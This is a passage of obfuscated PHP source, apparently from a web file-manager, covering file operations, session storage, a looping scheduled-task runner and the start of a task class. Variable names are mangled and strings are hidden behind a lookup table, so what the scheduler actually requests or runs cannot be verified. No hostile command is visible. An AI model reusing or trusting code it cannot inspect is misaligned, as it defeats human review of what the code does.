$”ò½ÆŸ®[1395]) { $ØÁô¯Ò = BASIC_PATH . substr($ØÁô¯Ò, 2); } $£ìØû‚à = KodIO::clear($£ìØû‚à); $ØÁô¯Ò = KodIO::clear($ØÁô¯Ò); $ØÁô¯Ò = substr($ØÁô¯Ò, strlen($£ìØû‚à)); if (empty($this->pathDriver)) { return $ØÁô¯Ò; } return $this->pathDriver . $”ò½ÆŸ®[8] . ltrim($ØÁô¯Ò, $”ò½ÆŸ®[8]); } public function mkfile($æâ÷¼ŞÄ, $ğş©ö±ğ = '', $ µ¯ˆ” = REPEAT_RENAME) { $æâ÷¼ŞÄ = $this->iconvSystem($æâ÷¼ŞÄ); @touch($æâ÷¼ŞÄ); if ($ğş©ö±ğ) { file_put_contents($æâ÷¼ŞÄ, $ğş©ö±ğ); } @chmod($æâ÷¼ŞÄ, $this->pathAuth); return is_file($æâ÷¼ŞÄ) ? $this->getPathOuter($æâ÷¼ŞÄ) : !1; } public function mkdir($½±şçêŠ, $ÙÇ‘Ê¡ = REPEAT_SKIP) { $½±şçêŠ = $this->iconvSystem($½±şçêŠ); if (is_dir($½±şçêŠ)) { return $this->getPathOuter($½±şçêŠ); } @mkdir($½±şçêŠ, $this->pathAuth, !0); @chmod($½±şçêŠ, $this->pathAuth); return is_dir($½±şçêŠ) ? $this->getPathOuter($½±şçêŠ) : !1; } public function copyFile($­Ğ§š¦ø, $–òäİóÙ) { $this->mkdir($this->pathFather($–òäİóÙ)); $­Ğ§š¦ø = $this->iconvSystem($­Ğ§š¦ø); $–òäİóÙ = $this->iconvSystem($–òäİóÙ); $Ôüó¦˜å = copy_64($­Ğ§š¦ø, $–òäİóÙ); @chmod($–òäİóÙ, $this->pathAuth); return $Ôüó¦˜å ? $this->getPathOuter($–òäİóÙ) : !1; } public function moveFile($ï‚ÊŠ™–, $Óá²´†×) { $this->mkdir($this->pathFather($Óá²´†×)); $ï‚ÊŠ™– = $this->iconvSystem($ï‚ÊŠ™–); $Óá²´†× = $this->iconvSystem($Óá²´†×); $“ª†Ç¸È = intval(@rename($ï‚ÊŠ™–, $Óá²´†×)); if (!$“ª†Ç¸È) { if ($“ª†Ç¸È = intval(@copy_64($ï‚ÊŠ™–, $Óá²´†×))) { @unlink($ï‚ÊŠ™–); } } @chmod($Óá²´†×, $this->pathAuth); return $“ª†Ç¸È ? $this->getPathOuter($Óá²´†×) : !1; } public function movePath($İªÚÈŸ, $â‹†ƒæƒ, $§ı©ıäÌ = false) { $Ÿà¸èı¢ =& $_SERVER[ •ŒÓîÆ]; $İªÚÈŸ = $this->iconvSystem($İªÚÈŸ); $â‹†ƒæƒ = $this->iconvSystem($â‹†ƒæƒ); $éœ¸·Æ = rtrim($â‹†ƒæƒ, $Ÿà¸èı¢[8]) . $Ÿà¸èı¢[8] . ($§ı©ıäÌ ? $§ı©ıäÌ : get_path_this($İªÚÈŸ)); if (file_exists($éœ¸·Æ)) { return !1; } $´¿›öÊ = intval(@rename($İªÚÈŸ, $éœ¸·Æ)); $´¿›öÊ = file_exists($éœ¸·Æ); return $´¿›öÊ ? $this->getPathOuter($éœ¸·Æ) : !1; } public function delFile($´ØÖÎ) { $´ØÖÎ = $this->iconvSystem($´ØÖÎ); if (!@unlink($´ØÖÎ)) { @chmod($´ØÖÎ, $this->pathAuth); if (!@unlink($´ØÖÎ)) { return !1; } } else { return !0; } } public function delFolder($ö›ŸòİÚ) { $Å„…««ç =& $_SERVER[ •ŒÓîÆ]; $ö›ŸòİÚ = $this->iconvSystem($ö›ŸòİÚ); if (!is_dir($ö›ŸòİÚ)) { return !0; } if (!($£À¨éÄ = opendir($ö›ŸòİÚ))) { return !1; } while (($©Öª™Í = readdir($£À¨éÄ)) !== !1) { if ($©Öª™Í == $Å„…««ç[10] || $©Öª™Í == $Å„…««ç[1319]) { continue; } $÷¯ìõÅı = $ö›ŸòİÚ . $Å„…««ç[8] . $©Öª™Í; if (is_file($÷¯ìõÅı) || is_link($÷¯ìõÅı)) { if (!unlink($÷¯ìõÅı)) { chmod($÷¯ìõÅı, $this->pathAuth); if (!unlink($÷¯ìõÅı)) { return !1; } } } else { if (is_dir($÷¯ìõÅı)) { chmod($÷¯ìõÅı, $this->pathAuth); $÷¯ìõÅı = $this->iconvApp($÷¯ìõÅı); if (!$this->delFolder($÷¯ìõÅı)) { return !1; } } } } closedir($£À¨éÄ); return rmdir($ö›ŸòİÚ); } public function rename($ø…’§ñ, $›“Ôçµò) { $Èª‹µ· =& $_SERVER[ •ŒÓîÆ]; $ËË‚ÙÏ = $this->fileNameAuto($this->pathFather($ø…’§ñ), $›“Ôçµò); $ËË‚ÙÏ = $this->iconvSystem($ËË‚ÙÏ); $ø…’§ñ = $this->iconvSystem($ø…’§ñ); $òô›½¾ = $this->pathFather($ø…’§ñ); $»Ø…î™ = rtrim($òô›½¾, $Èª‹µ·[8]) . $Èª‹µ·[8] . $ËË‚ÙÏ; $áŸ«Î¸· = @rename($ø…’§ñ, $»Ø…î™); $»Ø…î™ = $this->iconvApp($»Ø…î™); return $áŸ«Î¸· ? $this->getPathOuter($»Ø…î™) : !1; } public function size($ÆŒ‰é) { $ÆŒ‰é = $this->iconvSystem($ÆŒ‰é); return filesize_64($ÆŒ‰é); } public function info($ò÷ñ´ñ) { $ò÷ñ´ñ = $this->iconvSystem($ò÷ñ´ñ); if ($this->isFolder($ò÷ñ´ñ)) { return $this->folderInfo($ò÷ñ´ñ); } else { if ($this->isFile($ò÷ñ´ñ)) { return $this->fileInfo($ò÷ñ´ñ); } } return !1; } protected function infoChildren($ìõÎİÅÙ, &$Çá•·‰, $¹…‚ıè = true) { $¢¤í­Èª =& $_SERVER[ •ŒÓîÆ]; check_abort_echo(); $ìõÎİÅÙ = rtrim($ìõÎİÅÙ, $¢¤í­Èª[8]) . $¢¤í­Èª[8]; if ($¹…‚ıè) { $ìõÎİÅÙ = $this->iconvSystem($ìõÎİÅÙ); } if (!($¯ä‡ºàâ = @opendir($ìõÎİÅÙ))) { return; } while (($Õåïõ¿è = readdir($¯ä‡ºàâ)) !== !1) { if ($Õåïõ¿è == $¢¤í­Èª[10] || $Õåïõ¿è == $¢¤í­Èª[1319]) { continue; } $ùñ“ëíÎ = $ìõÎİÅÙ . $Õåïõ¿è; if (is_file($ùñ“ëíÎ) || is_link($ùñ“ëíÎ)) { $Çá•·‰[$¢¤í­Èª[79]]++; $Çá•·‰[$¢¤í­Èª[78]] += filesize_64($ùñ“ëíÎ); } else { if (is_dir($ùñ“ëíÎ)) { $Çá•·‰[$¢¤í­Èª[80]]++; $this->infoChildren($ùñ“ëíÎ, $Çá•·‰, !1); } } } closedir($¯ä‡ºàâ); } private function folderInfo($íœÛ¥õ, $À…Ü¼«ò = false) { $ Íšú =& $_SERVER[ •ŒÓîÆ]; $íœÛ¥õ = rtrim($íœÛ¥õ, $ Íšú[8]) . $ Íšú[8]; $ıî©¨ª = $this->iconvApp($this->pathThis($íœÛ¥õ)); if ($À…Ü¼«ò) { return array($ Íšú[32] => $ıî©¨ª, $ Íšú[86] => $this->getPathOuter($íœÛ¥õ), $ Íšú[33] => $ Íšú[77]); } $Ó«‹è†² = array($ Íšú[32] => $ıî©¨ª, $ Íšú[86] => $this->getPathOuter($íœÛ¥õ), $ Íšú[33] => $ Íšú[77], $ Íšú[217] => @filectime($íœÛ¥õ), $ Íšú[87] => @filemtime($íœÛ¥õ), $ Íšú[1404] => @fileatime($íœÛ¥õ), $ Íšú[1405] => is_readable($íœÛ¥õ), $ Íšú[1406] => is_writable($íœÛ¥õ), $ Íšú[1407] => get_mode($íœÛ¥õ)); return $Ó«‹è†²; } private function fileInfo($ñ¾í€ŞŞ, $œÓ Şùº = false) { $ˆô¶Øµ™ =& $_SERVER[ •ŒÓîÆ]; $€ìùùİÔ = $this->iconvApp($this->pathThis($ñ¾í€ŞŞ)); if ($œÓ Şùº) { return array($ˆô¶Øµ™[32] => $€ìùùİÔ, $ˆô¶Øµ™[86] => $this->getPathOuter($ñ¾í€ŞŞ), $ˆô¶Øµ™[33] => $ˆô¶Øµ™[216], $ˆô¶Øµ™[78] => $this->size($ñ¾í€ŞŞ), $ˆô¶Øµ™[177] => $this->ext($€ìùùİÔ)); } $®ßÔµ†‰ = array($ˆô¶Øµ™[32] => $€ìùùİÔ, $ˆô¶Øµ™[86] => $this->getPathOuter($ñ¾í€ŞŞ), $ˆô¶Øµ™[33] => $ˆô¶Øµ™[216], $ˆô¶Øµ™[217] => @filectime($ñ¾í€ŞŞ), $ˆô¶Øµ™[87] => @filemtime($ñ¾í€ŞŞ), $ˆô¶Øµ™[1404] => @fileatime($ñ¾í€ŞŞ), $ˆô¶Øµ™[78] => $this->size($ñ¾í€ŞŞ), $ˆô¶Øµ™[177] => $this->ext($€ìùùİÔ), $ˆô¶Øµ™[1405] => is_readable($ñ¾í€ŞŞ), $ˆô¶Øµ™[1406] => is_writable($ñ¾í€ŞŞ), $ˆô¶Øµ™[1407] => get_mode($ñ¾í€ŞŞ)); return $®ßÔµ†‰; } public function exist($‡Ó£—ˆä) { $‡Ó£—ˆä = $this->iconvSystem($‡Ó£—ˆä); return @file_exists($‡Ó£—ˆä); } public function isFile($Öë‰Öî—) { $Öë‰Öî— = $this->iconvSystem($Öë‰Öî—); return @is_file($Öë‰Öî—); } public function isFolder($¼ÍÆÍãş) { $¼ÍÆÍãş = $this->iconvSystem($¼ÍÆÍãş); return @is_dir($¼ÍÆÍãş); } public function listPath($½şÖˆ, $Ããµò™ó = false) { $û„¦¬·í =& $_SERVER[ •ŒÓîÆ]; $½şÖˆ = $this->iconvSystem($½şÖˆ); $½şÖˆ = rtrim($½şÖˆ, $û„¦¬·í[8]) . $û„¦¬·í[8]; $ƒÚÀÜì = array($û„¦¬·í[84] => array(), $û„¦¬·í[85] => array()); if (!($Ò–ßÙ¿ß = @opendir($½şÖˆ))) { return $ƒÚÀÜì; } while (($“îÃÜúÚ = readdir($Ò–ßÙ¿ß)) !== !1) { if ($“îÃÜúÚ == $û„¦¬·í[10] || $“îÃÜúÚ == $û„¦¬·í[1319]) { continue; } $ÂÎúîœú = $½şÖˆ . $“îÃÜúÚ; if (is_file($ÂÎúîœú)) { $ƒÚÀÜì[$û„¦¬·í[85]][] = $this->fileInfo($ÂÎúîœú, $Ããµò™ó); } else { $ƒÚÀÜì[$û„¦¬·í[84]][] = $this->folderInfo($ÂÎúîœú, $Ããµò™ó); } } closedir($Ò–ßÙ¿ß); return $ƒÚÀÜì; } public function listAll($»ıè®æ¹, &$«‘ŸäÔ‘ = array()) { $‡ñ‡á³ =& $_SERVER[ •ŒÓîÆ]; $»ıè®æ¹ = $this->iconvSystem($»ıè®æ¹); $»ıè®æ¹ = rtrim($»ıè®æ¹, $‡ñ‡á³[8]) . $‡ñ‡á³[8]; if (!($…Îø²øâ = @opendir($»ıè®æ¹))) { return $«‘ŸäÔ‘; } while (($ï³ÎÀ­­ = readdir($…Îø²øâ)) !== !1) { if ($ï³ÎÀ­­ == $‡ñ‡á³[10] || $ï³ÎÀ­­ == $‡ñ‡á³[1319]) { continue; } $¥ÁÂÎƒ = $»ıè®æ¹ . $ï³ÎÀ­­; $¹§ïÉ´ = is_dir($¥ÁÂÎƒ) && !is_link($¥ÁÂÎƒ) ? 1 : 0; $¥ÁÂÎƒ = $¹§ïÉ´ ? $¥ÁÂÎƒ . $‡ñ‡á³[8] : $¥ÁÂÎƒ; $«‘ŸäÔ‘[] = array($‡ñ‡á³[86] => $¥ÁÂÎƒ, $‡ñ‡á³[77] => $¹§ïÉ´, $‡ñ‡á³[87] => intval(@filemtime($¥ÁÂÎƒ)), $‡ñ‡á³[78] => $¹§ïÉ´ ? 0 : intval($this->size($¥ÁÂÎƒ))); if ($¹§ïÉ´) { $this->listAll($¥ÁÂÎƒ, $«‘ŸäÔ‘); } } closedir($…Îø²øâ); return $«‘ŸäÔ‘; } public function has($ß‘şÜÜ›, $í·íˆˆ = false, $ëÉ£°Í = true) { $È¯»Ø =& $_SERVER[ •ŒÓîÆ]; $ß‘şÜÜ› = $this->iconvSystem($ß‘şÜÜ›); $ß‘şÜÜ› = rtrim($ß‘şÜÜ›, $È¯»Ø[8]) . $È¯»Ø[8]; if (!($öı´™ò¦ = @opendir($ß‘şÜÜ›))) { return !1; } $‚ûßëÓÔ = 0; $ú“Ä¹ = 0; $÷Ğ÷¼Å = 0; while (($Š‰«ğƒ† = readdir($öı´™ò¦)) !== !1) { if ($Š‰«ğƒ† == $È¯»Ø[10] || $Š‰«ğƒ† == $È¯»Ø[1319]) { continue; } $¢”°ùŠæ = $ß‘şÜÜ› . $Š‰«ğƒ†; if ($í·íˆˆ) { $÷Ğ÷¼Å++; if (@is_file($¢”°ùŠæ)) { $‚ûßëÓÔ++; } else { $ú“Ä¹++; } if ($÷Ğ÷¼Å > 10000) { break; } continue; } if ($ëÉ£°Í) { if (@is_file($¢”°ùŠæ)) { return !0; } } else { if (@is_dir($¢”°ùŠæ . $È¯»Ø[8])) { return !0; } } } closedir($öı´™ò¦); if ($í·íˆˆ) { return array($È¯»Ø[225] => $‚ûßëÓÔ, $È¯»Ø[226] => $ú“Ä¹); } return !1; } public function hashSimple($ßî½ÙÌ…) { $şéñ’±ı =& $_SERVER[ •ŒÓîÆ]; if (!$ßî½ÙÌ…) { return md5($şéñ’±ı[12]); } $ßî½ÙÌ… = $this->iconvSystem($ßî½ÙÌ…); $ÓîÖø¹“ = $this->size($ßî½ÙÌ…); $•óâ•À = 200; $÷¶ıØïú = 50; if ($ÓîÖø¹“ <= $•óâ•À * $÷¶ıØïú) { return $this->hashMd5($ßî½ÙÌ…) . $ÓîÖø¹“; } $û­¨Ò = $şéñ’±ı[12]; $¤şä¶” = intval($ÓîÖø¹“ / $÷¶ıØïú); $–ÏÏÆµŒ = fopen($ßî½ÙÌ…, $şéñ’±ı[1408]); if (!$–ÏÏÆµŒ) { return $û­¨Ò; } for ($–ÓÑ‰†§ = 0; $–ÓÑ‰†§ < $÷¶ıØïú; $–ÓÑ‰†§++) { fseek_64($–ÏÏÆµŒ, $¤şä¶” * $–ÓÑ‰†§); $û­¨Ò .= fread($–ÏÏÆµŒ, $•óâ•À); } fseek_64($–ÏÏÆµŒ, $ÓîÖø¹“ - $•óâ•À); $û­¨Ò .= fread($–ÏÏÆµŒ, $•óâ•À); fclose($–ÏÏÆµŒ); return md5($û­¨Ò) . $ÓîÖø¹“; } public function getContent($«øà­«ò) { $«øà­«ò = $this->iconvSystem($«øà­«ò); return file_get_contents($«øà­«ò); } public function setContent($´‹µÒÕÖ, $Œü¤±Øª = '') { $´‹µÒÕÖ = $this->iconvSystem($´‹µÒÕÖ); $ÈÆ®¶ = @file_put_contents($´‹µÒÕÖ, $Œü¤±Øª, LOCK_EX); clearstatcache(); @chmod($´‹µÒÕÖ, $this->pathAuth); return $ÈÆ®¶ === !1 ? !1 : !0; } public function fileSubstr($¬“Ä„±, $·‚²Äõã = 0, $™ä±‰… = false) { $ìàººÆü =& $_SERVER[ •ŒÓîÆ]; $¬“Ä„± = $this->iconvSystem($¬“Ä„±); if ($™ä±‰… === !1) { $™ä±‰… = $this->size($¬“Ä„±); } if ($™ä±‰… <= 0) { return $ìàººÆü[12]; } $ßâ³ŸÈ = fopen($¬“Ä„±, $ìàººÆü[1408]); if (!$ßâ³ŸÈ) { return !1; } fseek_64($ßâ³ŸÈ, $·‚²Äõã); $Úóöç‡Â = fread($ßâ³ŸÈ, $™ä±‰…); fclose($ßâ³ŸÈ); return $Úóöç‡Â; } public function upload($§ÜÂ÷ª, $ş§«ÓÜ, $ê³˜¸¤æ = false, $©“°Ÿçê = REPEAT_REPLACE) { if ($ê³˜¸¤æ) { return $this->moveFile($ş§«ÓÜ, $§ÜÂ÷ª); } return $this->copyFile($ş§«ÓÜ, $§ÜÂ÷ª); } public function setModifyTime($—áÕù§«, $„ùï…µ = '') { @touch($—áÕù§«, intval($„ùï…µ)); } public function download($ïºè‰Ö•, $ªªŸÙ¼) { return $this->iconvSystem($ïºè‰Ö•); } } goto DµÃœğÓÙ¢; AÕÔ†¬Ñß×: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¾²Òîª =& $_SERVER[ •ŒÓîÆ]; static $Ğ“¦Œµâ = false; if ($Ğ“¦Œµâ) { return $Ğ“¦Œµâ; } $ÌÆ´³À = $GLOBALS[$¾²Òîª[6]][$¾²Òîª[404]]; self::$sessionTime = $ÌÆ´³À[$¾²Òîª[1642]]; $Çš¨áêª = isset($GLOBALS[$¾²Òîª[1643]]) ? $GLOBALS[$¾²Òîª[1643]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Çš¨áêª)) { self::$sessionSign = Cookie::get($Çš¨áêª); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Çš¨áêª, self::$sessionSign, self::$sessionTime); $óï´ïÀÒ = $ÌÆ´³À[$¾²Òîª[1644]]; $‡ÎµƒÈ§ = $ÌÆ´³À[$óï´ïÀÒ]; $ê» ğÁŸ = $ÌÆ´³À[$¾²Òîª[869]]; switch ($óï´ïÀÒ) { case $¾²Òîª[21]: self::$handle = Model($¾²Òîª[870]); break; case $¾²Òîª[871]: self::$handle = new CacheRedis($‡ÎµƒÈ§, $ê» ğÁŸ); break; case $¾²Òîª[872]: self::$handle = new CacheMemcached($‡ÎµƒÈ§, $ê» ğÁŸ); break; case $¾²Òîª[216]: $‡ÎµƒÈ§[$¾²Òîª[86]] = $‡ÎµƒÈ§[$¾²Òîª[86]] . $¾²Òîª[1645]; self::$handle = new CacheFile($‡ÎµƒÈ§, $ê» ğÁŸ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Ğ“¦Œµâ = new self(); return $Ğ“¦Œµâ; } public static function getBySign($šä×˜È) { $­ğ“é” = self::$handle->get($šä×˜È); $­ğ“é” = unserialize($­ğ“é”); return is_array($­ğ“é”) ? $­ğ“é” : array(); } public static function setBySign($şáñâÅî, $òÒúñüÂ) { CacheLock::lock($şáñâÅî); self::$handle->set($şáñâÅî, serialize($òÒúñüÂ), self::$sessionTime); CacheLock::unlock($şáñâÅî); } public static function sign($­Â’°²µ = false) { if ($­Â’°²µ) { self::$sessionSign = $­Â’°²µ; } self::init(); return self::$sessionSign; } public static function set($şÒÖ°ŒÛ, $¤‰ğ†¨¡ = false) { self::init(); if (is_array($şÒÖ°ŒÛ)) { foreach ($şÒÖ°ŒÛ as $²ªŞçƒ¡ => $×ë±úŒĞ) { array_set_value(self::$data, $²ªŞçƒ¡, $×ë±úŒĞ); } } else { array_set_value(self::$data, $şÒÖ°ŒÛ, $¤‰ğ†¨¡); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ºİÈçğß = false) { self::init(); if (!$ºİÈçğß) { return self::$data; } return array_get_value(self::$data, $ºİÈçğß); } public static function remove($„‘ù´ì¶) { self::init(); unset(self::$data[$„‘ù´ì¶]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ •ŒÓîÆ][875])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Şµì‡× =& $_SERVER[ •ŒÓîÆ]; if (self::valueGet($Şµì‡×[791]) != $Şµì‡×[90]) { return; } if (self::valueGet($Şµì‡×[1646]) == $Şµì‡×[90]) { $¹İœß†Ü = self::valueGet($Şµì‡×[1647]); if (time() - $¹İœß†Ü > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Şµì‡×[1646], $Şµì‡×[90]); self::log($Şµì‡×[1648] . ACTION . $Şµì‡×[1649]); Hook::bind($Şµì‡×[1650], $Şµì‡×[1651]); $ÂØ¾®¤» = 0; while (!0) { self::cacheClear(); if (self::valueGet($Şµì‡×[791]) != $Şµì‡×[90]) { self::valueSet($Şµì‡×[1646], $Şµì‡×[214]); self::log($Şµì‡×[1652]); die; } $šùˆó× = time(); if ($šùˆó× - $ÂØ¾®¤» >= 60) { self::valueSet(array($Şµì‡×[1646] => $Şµì‡×[90], $Şµì‡×[1647] => $šùˆó×), !1); $ÂØ¾®¤» = $šùˆó×; } if (!file_exists(USER_SYSTEM . $Şµì‡×[1653])) { self::valueSet(array($Şµì‡×[1646] => $Şµì‡×[214], $Şµì‡×[791] => $Şµì‡×[214]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $‹É€ûÌâ =& $_SERVER[ •ŒÓîÆ]; http_close(); $GLOBALS[$‹É€ûÌâ[1654]] = 1; $_SERVER[$‹É€ûÌâ[1655]] = $‹É€ûÌâ[1656]; $_COOKIE = array(); $GLOBALS[$‹É€ûÌâ[548]] = 1; $GLOBALS[$‹É€ûÌâ[1657]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ßÈÆİ‰Á =& $_SERVER[ •ŒÓîÆ]; http_close(); self::valueSet($ßÈÆİ‰Á[791], $ßÈÆİ‰Á[214]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ßÈÆİ‰Á[1646] => $ßÈÆİ‰Á[214], $ßÈÆİ‰Á[791] => $ßÈÆİ‰Á[90]), !1); } public static function taskSwitch() { $Í¸æœ…Š =& $_SERVER[ •ŒÓîÆ]; $‚ë“¶”Ï = self::valueGet($Í¸æœ…Š[791]) == $Í¸æœ…Š[90] ? $Í¸æœ…Š[214] : $Í¸æœ…Š[90]; self::valueSet($Í¸æœ…Š[791], $‚ë“¶”Ï); } public static function shutdownEvent() { $êåÛğ‹û =& $_SERVER[ •ŒÓîÆ]; self::valueSet($êåÛğ‹û[1646], $êåÛğ‹û[214]); self::log($êåÛğ‹û[1658]); } public static function config($Æ±ÖêÌí, $ÎÕ£ë›) { self::valueSet($_SERVER[ •ŒÓîÆ][791], $Æ±ÖêÌí); } private static function taskRunAll() { $®šÙ¸Œ¯ =& $_SERVER[ •ŒÓîÆ]; $é¸»”‹ = timeFloat(); $Ì¥íÃêŒ = Model($®šÙ¸Œ¯[1659])->listData(); $ÒÂŞ³¥Ç = count($Ì¥íÃêŒ); for ($óËŸƒŞ” = 0; $óËŸƒŞ” < $ÒÂŞ³¥Ç; $óËŸƒŞ”++) { $ÛÒ£» ¯ = $Ì¥íÃêŒ[$óËŸƒŞ”]; if (!$ÛÒ£» ¯[$®šÙ¸Œ¯[453]] || $ÛÒ£» ¯[$®šÙ¸Œ¯[1660]] != $®šÙ¸Œ¯[90]) { continue; } if (!self::taskTimeCheck($ÛÒ£» ¯)) { continue; } self::taskRun($ÛÒ£» ¯); } Hook::trigger($®šÙ¸Œ¯[1661]); self::taskQueueRun($é¸»”‹); } private static function taskQueueRun($ûı’± ƒ) { $£“£€âÑ = 10; while (!0) { $Ö•–ÎíÃ = TaskQueue::run(); if ($Ö•–ÎíÃ === !1) { break; } if (timeFloat() - $ûı’± ƒ >= $£“£€âÑ) { break; } } } private static function taskTimeCheck($à¿ˆİî´) { $”Ü¤æ =& $_SERVER[ •ŒÓîÆ]; $•ñº¡§ = json_decode($à¿ˆİî´[$”Ü¤æ[196]], !0); $’Šôëáş = intval($à¿ˆİî´[$”Ü¤æ[1647]]); $€°¼Éñä = strtotime($”Ü¤æ[1662] . $•ñº¡§[$”Ü¤æ[1663]] . $”Ü¤æ[1664]) - strtotime($”Ü¤æ[1665]); $ß÷ã¸·Ë = time() - strtotime(date($”Ü¤æ[1666]) . $”Ü¤æ[1667]); $‰áñ¥Ì = $ß÷ã¸·Ë >= $€°¼Éñä && $ß÷ã¸·Ë <= $€°¼Éñä + 3600; switch ($•ñº¡§[$”Ü¤æ[33]]) { case $”Ü¤æ[1668]: if (time() - $’Šôëáş < 3600 * 24 * 30) { return !1; } if ($•ñº¡§[$”Ü¤æ[1668]] == date($”Ü¤æ[1669]) && $‰áñ¥Ì) { return !0; } break; case $”Ü¤æ[1670]: if (time() - $’Šôëáş < 3600 * 24 * 7) { return !1; } $©À¥»™§ = date($”Ü¤æ[1671]) == 0 ? 7 : date($”Ü¤æ[1671]); if ($•ñº¡§[$”Ü¤æ[1670]] == $©À¥»™§ && $‰áñ¥Ì) { return !0; } break; case $”Ü¤æ[1663]: if (time() - $’Šôëáş < 3600 * 24) { return !1; } if ($‰áñ¥Ì) { return !0; } break; case $”Ü¤æ[1672]: if (time() - $’Šôëáş >= floatval($•ñº¡§[$”Ü¤æ[1672]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ —ÃØíß =& $_SERVER[ •ŒÓîÆ]; static $‰Á’¡‘¿ = 0; $ø÷¿¸’à = 300; if (!$‰Á’¡‘¿) { $‰Á’¡‘¿ = time(); } if (time() - $‰Á’¡‘¿ < $ø÷¿¸’à) { return; } $‰Á’¡‘¿ = time(); $½Ú£ùÏ¿ = Model($ —ÃØíß[558])->db($ —ÃØíß[12]); if ($½Ú£ùÏ¿) { $½Ú£ùÏ¿->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ —ÃØíß[1673], $ —ÃØíß[1674]); die; } } public static function taskRun($ÄÔ…¥Àé) { $¹±Ï˜µ =& $_SERVER[ •ŒÓîÆ]; self::log($¹±Ï˜µ[1675] . $ÄÔ…¥Àé[$¹±Ï˜µ[453]] . $¹±Ï˜µ[1676] . $ÄÔ…¥Àé[$¹±Ï˜µ[32]] . $¹±Ï˜µ[1677] . $ÄÔ…¥Àé[$¹±Ï˜µ[1678]]); Model($¹±Ï˜µ[1659])->run($ÄÔ…¥Àé[$¹±Ï˜µ[453]]); $‹ÎŒ¼ÜÏ = timeFloat(); $µ½éÔÛ— = $¹±Ï˜µ[12]; switch ($ÄÔ…¥Àé[$¹±Ï˜µ[33]]) { case $¹±Ï˜µ[362]: $Š Åëœ = url_request($ÄÔ…¥Àé[$¹±Ï˜µ[1678]], $¹±Ï˜µ[247], !1, !1, !1, !1, 10); if ($Š Åëœ[$¹±Ï˜µ[791]]) { $µ½éÔÛ— = strlen($Š Åëœ[$¹±Ï˜µ[1243]]); } break; case $¹±Ï˜µ[246]: $µ½éÔÛ— = Hook::apply($ÄÔ…¥Àé[$¹±Ï˜µ[1678]]); default: break; } Model($¹±Ï˜µ[1679])->add(array($¹±Ï˜µ[1680] => $¹±Ï˜µ[12], $¹±Ï˜µ[1681] => $¹±Ï˜µ[214], $¹±Ï˜µ[33] => $¹±Ï˜µ[1682] . $ÄÔ…¥Àé[$¹±Ï˜µ[453]], $¹±Ï˜µ[1683] => json_encode(array($¹±Ï˜µ[32] => $ÄÔ…¥Àé[$¹±Ï˜µ[32]], $¹±Ï˜µ[1684] => timeFloat() - $‹ÎŒ¼ÜÏ, $¹±Ï˜µ[348] => $µ½éÔÛ—)))); $³ß²£ğë = $µ½éÔÛ— ? $¹±Ï˜µ[1685] . $µ½éÔÛ— : $¹±Ï˜µ[12]; self::log($¹±Ï˜µ[1686] . $ÄÔ…¥Àé[$¹±Ï˜µ[453]] . $¹±Ï˜µ[167] . $³ß²£ğë); return !0; } public static function valueGet($Ğµ“Àˆ³) { $°Å†ğÜŸ =& $_SERVER[ •ŒÓîÆ]; $»ºëÆ’® = $°Å†ğÜŸ[1687]; $¥É¯¿Ãç = Model($°Å†ğÜŸ[487])->get($Ğµ“Àˆ³, $»ºëÆ’®); if (is_null($¥É¯¿Ãç)) { Model($°Å†ğÜŸ[487])->set($°Å†ğÜŸ[791], $°Å†ğÜŸ[90], $»ºëÆ’®); Model($°Å†ğÜŸ[487])->set($°Å†ğÜŸ[1646], $°Å†ğÜŸ[214], $»ºëÆ’®); $¥É¯¿Ãç = Model($°Å†ğÜŸ[487])->get($Ğµ“Àˆ³, $»ºëÆ’®); } return $¥É¯¿Ãç; } private static function valueSet($Úğş×ô†, $Ş„÷˜) { $œ›§Ù¨ =& $_SERVER[ •ŒÓîÆ]; $ºÕ•è¡È = $œ›§Ù¨[1688]; CacheLock::lock($ºÕ•è¡È); $éö…˜‹ô = Model($œ›§Ù¨[487])->set($Úğş×ô†, $Ş„÷˜, $œ›§Ù¨[1687]); CacheLock::unlock($ºÕ•è¡È); return $éö…˜‹ô; } protected static function log($Ğê”¦äª) { write_log($Ğê”¦äª, $_SERVER[ •ŒÓîÆ][1674]); } private static function cacheClear() { $¨ÏîĞ¯È =& $_SERVER[ •ŒÓîÆ]; Cache::clearMemory(Model($¨ÏîĞ¯È[487])->cacheKey($¨ÏîĞ¯È[1687])); Cache::clearMemory(Model($¨ÏîĞ¯È[487])->cacheKey($¨ÏîĞ¯È[1689])); Model($¨ÏîĞ¯È[1659])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\156\x67"; const STATYS_KILL = "\153\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¹«ïÜ—œ, $Íã¸µ´ = '', $ğ¥°îÅî = 0, $œª½Øª½ = '') { $øş¬­· =& $_SERVER[ •ŒÓîÆ]; if (self::get($¹«ïÜ—œ)) { return; } $this->task = array($øş¬­·[453] => $¹«ïÜ—œ, $øş¬­·[1690] => USER_ID, $øş¬­·[1585] => $œª½Øª½, $øş¬­·[505] => $øş¬­·[12], $øş¬­·[33] => $Íã¸µ´, $øş¬­·[1105] => $øş¬­·[12], $øş¬­·[827] => $ğ¥°îÅî, $øş¬­·[1691] => 0, $øş¬­·[1692] => 0, $øş¬­·[1693] => 0, $øş¬­·[1694] => timeFloat(), $øş¬­·[1695] 